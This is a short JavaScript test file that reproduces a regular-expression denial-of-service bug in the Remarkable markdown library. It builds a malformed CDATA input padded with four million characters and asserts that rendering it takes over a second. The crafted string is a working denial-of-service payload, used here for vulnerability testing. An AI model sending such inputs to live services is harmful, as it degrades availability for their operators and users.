test("ReDos in remarkable", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  const Remarkable = require("remarkable");
  let md = new Remarkable("commonmark");
  let t = measureTime(function () {
    let attack_str =
      `# Remarkable rulezz!<a>z</a><![CDATA[` + genstr(4000000, "a") + `]] >`;
    md.render(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
